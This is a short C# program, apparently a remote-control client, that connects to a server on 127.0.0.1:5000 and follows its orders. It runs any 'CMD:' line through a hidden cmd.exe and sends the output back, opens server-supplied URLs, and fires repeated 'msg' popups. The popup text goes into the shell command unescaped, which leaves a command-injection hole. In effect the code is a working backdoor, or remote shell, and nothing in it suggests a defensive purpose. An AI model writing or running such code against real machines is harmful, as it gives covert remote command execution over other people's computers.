using System.Net.Sockets;
using System.Diagnostics;


var stream = new TcpClient("127.0.0.1", 5000).GetStream();
var reader = new StreamReader(stream);
var writer = new StreamWriter(stream) {AutoFlush=true};

string name = "Client";
writer.WriteLine("USR:" + "Подключился клиент:" + name);
while (true)
{
    
    var data = reader.ReadLine();
    if (data.StartsWith("MSG:"))
    {
        Console.WriteLine(data.Substring(4));
    }
    else if (data.StartsWith("URL:"))
    {
        var url = data.Substring(4);
        Process.Start(new ProcessStartInfo(url) { UseShellExecute = true }); // Открываем в браузер
    }
    else if (data.StartsWith("CMD:"))
    {
        var psi = new ProcessStartInfo("cmd.exe", "/c " + data.Substring(4))
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        using var p = Process.Start(psi)!;
        var output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        writer.WriteLine("OUT:" + output.Replace("\r", "").Replace("\n", "\\n"));
    }
    else if (data.StartsWith("[MSG]"))
    {
        var l2 = reader.ReadLine();   // "MSGG:<text>"
        var l3 = reader.ReadLine();   // "AMTT:<N>"

        string text = "";
        int amout = 0;

        if (l2 != null && l2.StartsWith("MSGG:")) text = l2.Substring(5);
        if (l3 != null && l3.StartsWith("AMTT:")) int.TryParse(l3.Substring(5), out amout);

        for (int i = 0; i < amout; i++)
        {
            var psi = new ProcessStartInfo("cmd.exe", $"/c msg * \"{text}\"")
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var p = Process.Start(psi)!;
            var output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            Console.WriteLine(output);
        }
    }
}